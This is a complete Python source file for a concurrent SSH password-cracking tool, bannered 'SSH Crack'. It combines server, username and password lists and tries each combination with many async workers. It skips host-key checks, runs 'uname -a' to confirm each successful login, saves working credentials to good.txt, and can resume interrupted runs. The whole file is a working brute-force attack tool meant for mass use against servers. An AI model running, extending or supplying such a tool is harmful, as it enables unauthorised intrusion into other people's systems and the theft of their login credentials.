import asyncio
import configparser
import logging
import math
import os
import shutil
import sys
import time
from dataclasses import dataclass, field
from itertools import islice, product
from pathlib import Path
from typing import Any

from more_itertools import chunked, ilen
from rich.console import Console
from rich.progress import Progress, TaskID
import asyncssh


VERSION = "v1.0.0"


@dataclass
class SharedContext:
    console: Console
    max_workers: int
    default_ssh_port: int
    timeout: int
    logger: logging.Logger | None
    DEBUG: int
    remaining: int = field(init=False)
    current_line: int = field(init=False)
    last_comb_line: int = field(init=False)
    seed: int = field(init=False)
    good: int = 0
    bad: int = 0
    active_worker_count: int = 0
    good_servers: set = field(default_factory=set)
    unique_good_result_lock: asyncio.Lock = asyncio.Lock()
    exit_program: bool = False

    stg_pt: Path = field(init=False)
    user_pt: Path = field(init=False)
    pass_pt: Path = field(init=False)
    sv_pt: Path = field(init=False)
    good_pt: Path = field(init=False)
    msg_to_good_sv_map_str: str = field(init=False)

    sv_len: int = field(init=False)
    user_len: int = field(init=False)
    pass_len: int = field(init=False)

    def __post_init__(self):
        self.stg_pt = Path(__file__).parent / "settings.ini"

        self.user_pt = Path(__file__).parent / "users.txt"
        self.pass_pt = Path(__file__).parent / "passwords.txt"
        self.sv_pt = Path(__file__).parent / "servers.txt"
        self.good_pt = Path(__file__).parent / "good.txt"

        if not self.good_pt.exists():
            self.good_pt.touch()

        get_input(self.console, self)

        config = configparser.ConfigParser()

        config.read(self.stg_pt)

        self.current_line = self.last_comb_line = int(
            config["SavedState"]["combination"]
        )
        self.seed = int(config["SavedState"]["seed"])
        with self.sv_pt.open("r", encoding="utf-8", errors="replace") as sv_f:
            with self.user_pt.open("r", encoding="utf-8", errors="replace") as user_f:
                with self.pass_pt.open(
                    "r", encoding="utf-8", errors="replace"
                ) as pass_f:
                    self.sv_len = ilen(sv_f)
                    self.user_len = ilen(user_f)
                    self.pass_len = ilen(pass_f)
                    # This formula is as stupid as it gets. I hope I could remove it but I can't
                    self.remaining = (
                        (
                            self.sv_len * self.user_len * self.pass_len
                        )  # Counts the entire combination
                        - self.last_comb_line  # Then the last saved (virtual) combination line number is subtracted
                    )
        if self.logger is not None:
            self.logger.info(f"SSH_Checker {VERSION}")
            self.logger.info(f"Max workers: {self.max_workers}")
            self.logger.info(f"Seed: {self.seed}")
            self.logger.info(f"Global timeout: {self.timeout}")
            self.logger.info(f"Default SSH Port: {self.default_ssh_port}")


def setup_logger(debug_level: int):
    logger = logging.getLogger(__name__)
    logger.setLevel(logging.DEBUG)
    log_formatter = logging.Formatter(
        "%(asctime)s.%(msecs)03d - %(name)s - %(levelname)s - %(message)s",
        "%Y-%m-%d %H:%M:%S",
    )

    internal_pt = Path(__file__).parent

    log_file_handler = logging.FileHandler(internal_pt / "ssh_checker.log")
    log_file_handler.setFormatter(log_formatter)
    logger.addHandler(log_file_handler)

    if debug_level >= 2:
        asyncssh.logger.logger.addHandler(log_file_handler)
        asyncssh.set_log_level(logging.DEBUG)
    if debug_level == 3:
        asyncssh.set_debug_level(2)
    if debug_level == 4:
        asyncssh.set_debug_level(3)

    return logger


def banner(console: Console):
    """
    Prints a banner in console
    :param console: The console object to print the banner in
    :return: Nothing
    """

    if console.legacy_windows:
        os.system("cls")
    else:
        console.clear()

    console.print(
        "[red]╔══════════════════════════════════════════════════════════════════════════════════════════════════════════════╗\n"
        "║            [yellow bold]                               ,--,                                                   [/]            ║\n"
        "║            [yellow bold]  .--.--.    .--.--.         ,--.'|  ,----..                                     ,-.  [/]            ║\n"
        "║            [yellow bold] /  /    '. /  /    '.    ,--,  | : /   /   \                                ,--/ /|  [/]            ║\n"
        "║            [yellow bold]|  :  /`. /|  :  /`. / ,---.'|  : '|   :     :  __  ,-.                    ,--. :/ |  [/]            ║\n"
        "║            [yellow bold];  |  |--` ;  |  |--`  |   | : _' |.   |  ;. /,' ,'/ /|                    :  : ' /   [/]            ║\n"
        "║            [yellow bold]|  :  ;_   |  :  ;_    :   : |.'  |.   ; /--` '  | |' | ,--.--.     ,---.  |  '  /    [/]            ║\n"
        "║            [yellow bold] \  \    `. \  \    `. |   ' '  ; :;   | ;    |  |   ,'/       \   /     \ '  |  :    [/]            ║\n"
        "║             [yellow bold]  `----.   \ `----.   '   |  .'. ||   : |    '  :  / .--.  .-. | /    / ' |  |   \   [/]            ║\n"
        "║            [yellow bold]  __ \  \  | __ \  \  ||   | :  | '.   | '___ |  | '   \__\/: . ..    ' /  '  : |. \  [/]            ║\n"
        "║            [yellow bold] /  /`--'  //  /`--'  /'   : |  : ;'   ; : .'|;  : |   ,\" .--.; |'   ; :__ |  | ' \ \ [/]            ║\n"
        "║            [yellow bold]'--'.     /'--'.     / |   | '  ,/ '   | '/  :|  , ;  /  /  ,.  |'   | '.'|'  : |--'  [/]            ║\n"
        "║            [yellow bold]  `--'---'   `--'---'  ;   : ;--'  |   :    /  ---'  ;  :   .'   \   :    :;  |,'     [/]            ║\n"
        "║            [yellow bold]                       |   ,/       \   \ .'         |  ,     .-./\   \  / '--'       [/]            ║\n"
        "║            [yellow bold]                       '---'         `---`            `--`---'     `----'             [/]            ║\n"
        "║            [yellow bold]                                                                                      [/]            ║\n"
        "╠══════════════════════════════════════════════════════════════════════════════════════════════════════════════╣\n"
        f"║                                                   [red]SSH Crack[/]                            [blue]{VERSION:>18}[/]    ║\n"
        "╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════╝\n",
        justify="center",
    )


def chunkify_server(
    sv_pt: Path,
):
    with sv_pt.open("r", encoding="utf-8", errors="replace") as server_f:
        for chunk in chunked(server_f, 1000):
            yield chunk


def get_combo_server_credentials_pre(
    sv_pt: Path,
    user_pt: Path,
    pass_pt: Path,
):
    # Since password list isn't long, we're not gonna chunk it.
    with pass_pt.open("r", encoding="utf-8", errors="replace") as pass_f:
        # Since user list isn't long, we're not gonna chunk it.
        with user_pt.open("r", encoding="utf-8", errors="replace") as user_f:
            # But server list is long, so we must chunk it.
            for srvs_chunk in chunkify_server(sv_pt):
                # Seek user_f and pass_f to line 0 after every chunk.
                pass_f.seek(0)
                user_f.seek(0)

                # We test all passwords and users on a specific chunk before moving on to the next chunk
                product_iter = product(pass_f, user_f, srvs_chunk)

                for data in product_iter:
                    yield data


def get_combo_server_credentials(
    sv_pt: Path,
    user_pt: Path,
    pass_pt: Path,
    default_port: int,
    last_comb_line: int = 1,
):
    product_iter = get_combo_server_credentials_pre(sv_pt, user_pt, pass_pt)
    # And we create a virtual line cursor.
    enumerated_product_iter = enumerate(product_iter)

    # And we start from last combination line until we reach the end
    final_iter = islice(enumerated_product_iter, last_comb_line - 1, None)

    for line, data in final_iter:
        # server ip and port are in index 2 since we put at the end of product()
        try:
            if data[2].strip().endswith("#0"):
                ip, port = data[2].strip().replace("#0", ""), default_port
            else:
                ip, port = data[2].strip().split(":")
        except ValueError as exc:
            ip, port = data[2].strip(": \n\t"), default_port

        # And password in index 0 and user in index 1
        yield line + 1, ip, int(port), data[1].strip(), data[0].strip()


async def save_result_to_file(server, port, username, password, ctx: SharedContext):
    with ctx.good_pt.open("a", encoding="utf-8", errors="replace") as good_f:
        good_f.write(f"{server}:{port}\\{username}:{password}\n")
        ctx.good_servers.add(server)


async def is_good(sv: str, port: int, usr: str, passw: str, ctx: SharedContext):
    try:
        async with asyncssh.connect(
            sv,
            port,
            username=usr,
            password=passw,
            known_hosts=None,
            connect_timeout=ctx.timeout,
            login_timeout=ctx.timeout,
            config=None,
        ) as conn:
            result = await conn.run("uname -a", timeout=ctx.timeout, check=True)
            if str(result.stdout).split(" ", 1)[0] == "Linux":
                return True
            return False
    except (asyncssh.ConnectionLost, asyncio.CancelledError) as exc:
        return False
    except asyncssh.Error as exc:
        if ctx.logger is not None:
            ctx.logger.info(
                f"Found Exception - sv: {sv}, port: {port}, user: {usr}, pass: {passw}"
            )
            ctx.logger.exception(exc, exc_info=False)
        return False
    except TimeoutError as exc:
        if ctx.logger is not None:
            ctx.logger.info(
                f"Found Exception - sv: {sv}, port: {port}, user: {usr}, pass: {passw}"
            )
            ctx.logger.exception(exc, exc_info=False)
        return False
    except (ConnectionResetError, ConnectionRefusedError) as exc:
        if ctx.logger is not None:
            ctx.logger.info(
                f"Found Exception - sv: {sv}, port: {port}, user: {usr}, pass: {passw}"
            )
            ctx.logger.exception(exc, exc_info=False)
        return False
    except OSError as exc:
        if ctx.logger is not None:
            ctx.logger.info(
                f"Found Exception - sv: {sv}, port: {port}, user: {usr}, pass: {passw}"
            )
            ctx.logger.exception(exc, exc_info=False)
        return False
    except Exception as exc:
        if ctx.logger is not None:
            ctx.logger.exception(exc)
        raise


async def handle(
    console: Console,
    progress: Progress,
    task: TaskID,
    ctx: SharedContext,
    queue: asyncio.Queue,
) -> None:
    if ctx.DEBUG == -1:
        sys.stderr = open(os.devnull, "w")
    while True:
        line, sv, port, usr, passw = await queue.get()
        result: bool = await is_good(sv, port, usr, passw, ctx)
        if result is False:
            ctx.bad += 1
        elif result is True:
            if ctx.logger is not None:
                ctx.logger.info(
                    f"Found Good: line: {line}, sv: {sv}, port: {port}, usr: {usr}, passw: {passw}"
                )
            ctx.good += 1
            console.print(f"[+] {sv} >> username: {usr} , password: {passw}")
            await ctx.unique_good_result_lock.acquire()
            await save_result_to_file(sv, port, usr, passw, ctx)
            ctx.unique_good_result_lock.release()
        if ctx.remaining == 0:
            console.print("Done!")
        queue.task_done()
        ctx.remaining -= 1
        ctx.current_line = line
        progress.advance(task)


async def start_workers(
    console: Console,
    progress: Progress,
    task: TaskID,
    ctx: SharedContext,
    queue: asyncio.Queue,
):
    for _ in range(ctx.max_workers):
        asyncio.create_task(handle(console, progress, task, ctx, queue))
        ctx.active_worker_count += 1


async def put_in_queue(ctx: SharedContext, queue: asyncio.Queue) -> None:
    for line, sv, port, usr, passw in get_combo_server_credentials(
        ctx.sv_pt,
        ctx.user_pt,
        ctx.pass_pt,
        ctx.default_ssh_port,
        ctx.last_comb_line,
    ):
        await queue.put((line, sv, port, usr, passw))
    await queue.join()
    sys.exit(0)


async def update_progress(progress: Progress, task: TaskID, ctx: SharedContext):
    start_time = time.perf_counter()
    last_remaining = ctx.remaining
    while True:
        avg_cps = (ctx.bad + ctx.good) / math.ceil(time.perf_counter() - start_time)
        progress.update(
            task,
            description=f"(AVG_CPS: {format(avg_cps, '.2f')}, Workers: {ctx.active_worker_count} / "
            f"CPS: {last_remaining - ctx.remaining}) "
            f"[green]Good: {ctx.good},[red] Bad: {ctx.bad},[yellow] Remaining: {ctx.remaining}",
            advance=1,
        )
        update_settings(ctx)
        last_remaining = ctx.remaining
        await asyncio.sleep(1)


def get_input(console: Console, ctx: SharedContext) -> None:
    while not ctx.sv_pt.exists() or not ctx.sv_pt.is_file():
        input_sv_file = Path(console.input("Enter the servers list file > "))
        if input_sv_file.exists():
            if input_sv_file.is_file():
                shutil.move(
                    input_sv_file,
                    ctx.sv_pt,
                )
                break
            else:
                console.print("Path is not a file!")
        else:
            console.print("Path does not exist!")

    while not ctx.user_pt.exists() or not ctx.user_pt.is_file():
        input_creds_file = Path(console.input("Enter the user list file > "))
        if input_creds_file.exists():
            if input_creds_file.is_file():
                shutil.move(input_creds_file, ctx.user_pt)
                break
            else:
                console.print("Path is not a file!")
        else:
            console.print("Path does not exist!")

    while not ctx.pass_pt.exists() or not ctx.pass_pt.is_file():
        input_creds_file = Path(console.input("Enter the password list file > "))
        if input_creds_file.exists():
            if input_creds_file.is_file():
                shutil.move(
                    input_creds_file,
                    ctx.pass_pt,
                )
                break
            else:
                console.print("Path is not a file!")
        else:
            console.print("Path does not exist!")


def get_startup_values(console: Console, logger: logging.Logger | None):
    while True:
        try:
            max_workers = int(
                console.input("Enter the count of workers to start [100] > ") or 100
            )
            break
        except ValueError as exc:
            console.print("Invalid input, Please enter a number.")
            if logger is not None:
                logger.exception(exc)

    while True:
        try:
            ssh_port = int(console.input("Enter the default ssh port [22] > ") or 22)
            break
        except ValueError as exc:
            console.print("Invalid input, Please enter a number.")
            if logger is not None:
                logger.exception(exc)

    while True:
        try:
            timeout = int(console.input("Enter timeout [20] > ") or 20)
            break
        except ValueError as exc:
            console.print("Invalid input, Please enter a number.")
            if logger is not None:
                logger.exception(exc)

    return max_workers, ssh_port, timeout


def debug_choice(console):
    while True:
        try:
            debug = (
                console.input(
                    "Debug? (-1: No stderr | 0: Off | 1: On | 2/3/4: Higher levels | ?: Help) : [0] > "
                )
                or "0"
            )
            if debug == "?":
                console.print(
                    "-1. No stderr: Basically nothing is logged or shown, void as /dev/null.\n"
                    "0. Normal mode: Logging is off but you can still see exceptions that aren't handled and logged.\n"
                    "1. Logging On: Logging is on, but only logs the user handled exceptions.\n"
                    "2. User and Library: User logs and Library logs are logged (Recommended).\n"
                    "3. User and Library Supercharged: User and Library are fully logged (Maximum library logging).\n"
                    "4. EVERYTHING IS LOGGED: Full debugging with packet dumps. (WARNING: It will fill your space)"
                )
                continue
            debug = int(debug)
            if debug in [-1, 0, 1, 2, 3, 4]:
                break
            else:
                console.print("Invalid option, please enter a number from -1 up to 4.")
                continue
        except ValueError as exc:
            console.print("Invalid input, Please enter a number.")

    return debug


def update_settings(ctx: SharedContext):
    cfg_parser = configparser.ConfigParser()
    cfg_parser["SavedState"] = {
        "combination": str(ctx.current_line),
        "seed": str(ctx.seed),
    }
    with ctx.stg_pt.open("w", encoding="utf-8", errors="replace") as cfg_file:
        cfg_parser.write(cfg_file)


async def async_main() -> SharedContext:
    console = Console()
    banner(console)

    debug = debug_choice(console)

    if debug in [1, 2, 3, 4]:
        logger = setup_logger(debug)
    else:
        logger = None

    max_workers, ssh_port, timeout = get_startup_values(console, logger)
    ctx = SharedContext(console, max_workers, ssh_port, timeout, logger, debug)
    queue: asyncio.Queue[Any] = asyncio.Queue(max_workers * 3)

    banner(console)
    progress = Progress()
    progress.start()
    task = progress.add_task(
        f"(Workers: {ctx.active_worker_count}) [green]Good: {ctx.good},[red] Bad:"
        f" {ctx.bad},[yellow] Remaining: {ctx.remaining}",
        total=ctx.remaining,
    )

    asyncio.create_task(put_in_queue(ctx, queue))
    await start_workers(console, progress, task, ctx, queue)
    asyncio.create_task(update_progress(progress, task, ctx))

    return ctx


def main():
    try:
        loop = asyncio.get_event_loop()
        ctx = loop.run_until_complete(async_main())
        loop.run_forever()
        sys.exit(0)
    except (KeyboardInterrupt, SystemExit):
        sys.exit(0)
    except (Exception, asyncio.CancelledError) as exc:
        if ctx.DEBUG:
            ctx.logger.exception(exc)
        raise


if __name__ == "__main__":
    try:
        main()
    except (KeyboardInterrupt, SystemExit):
        ...
    except Exception:
        print("Fatal error: Cannot start the program")
        raise
